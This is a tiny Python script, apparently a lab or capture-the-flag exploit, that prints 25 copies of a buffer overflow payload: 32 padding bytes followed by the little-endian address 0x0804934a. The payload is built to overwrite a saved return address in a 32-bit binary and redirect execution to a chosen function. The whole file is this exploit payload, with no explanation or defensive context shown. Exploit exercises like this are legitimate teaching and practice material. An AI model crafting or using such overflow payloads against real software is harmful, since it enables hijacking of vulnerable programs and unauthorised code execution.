import sys


for i in range(0, 25):
    sys.stdout.buffer.write(32 * b"C" + b"\x4a\x93\x04\x08" + b"\x0a")
